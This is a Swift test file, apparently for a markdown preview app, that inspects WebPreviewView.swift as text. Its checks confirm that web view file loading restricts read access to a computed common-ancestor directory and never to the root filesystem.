runner.test("WebPreviewView does NOT grant read access to root filesystem") {
    let source = try String(contentsOfFile: "Sources/MarkView/WebPreviewView.swift", encoding: .utf8)
    // Ensure no loadFileURL call passes "/" as the access scope
    try expect(!source.contains("allowingReadAccessTo: URL(fileURLWithPath: \"/\")"),
        "allowingReadAccessTo must NOT be root '/' — restricts to narrowest necessary directory")
}

runner.test("restrictedAccessURL helper exists with correct signature") {
    let source = try String(contentsOfFile: "Sources/MarkView/WebPreviewView.swift", encoding: .utf8)
    try expect(source.contains("static func restrictedAccessURL(tempFile: URL, baseDirectory: URL?) -> URL"),
        "restrictedAccessURL helper must exist as a static method")
    try expect(source.contains("guard let baseDir = baseDirectory else"),
        "restrictedAccessURL must return tempDir when baseDirectory is nil")
}

runner.test("restrictedAccessURL computes common ancestor") {
    let source = try String(contentsOfFile: "Sources/MarkView/WebPreviewView.swift", encoding: .utf8)
    try expect(source.contains("commonComponents"),
        "restrictedAccessURL must compute the common ancestor of temp and base directories")
}

runner.test("restrictedAccessURL rejects root as common ancestor") {
    let source = try String(contentsOfFile: "Sources/MarkView/WebPreviewView.swift", encoding: .utf8)
    try expect(source.contains("commonComponents.count <= 1"),
        "restrictedAccessURL must reject root '/' as a common ancestor (safety check)")
}

runner.test("loadViaFileURL uses restrictedAccessURL for access scope") {
    let source = try String(contentsOfFile: "Sources/MarkView/WebPreviewView.swift", encoding: .utf8)
    try expect(source.contains("Self.restrictedAccessURL(tempFile: tempFile, baseDirectory: baseDirectoryURL)"),
        "loadViaFileURL must call restrictedAccessURL to compute the access scope")
    try expect(source.contains("allowingReadAccessTo: accessURL"),
        "loadFileURL must use the computed accessURL, not a hardcoded path")
}

// =============================================================================

print("")
runner.summary()
exit(runner.failed > 0 ? 1 : 0)
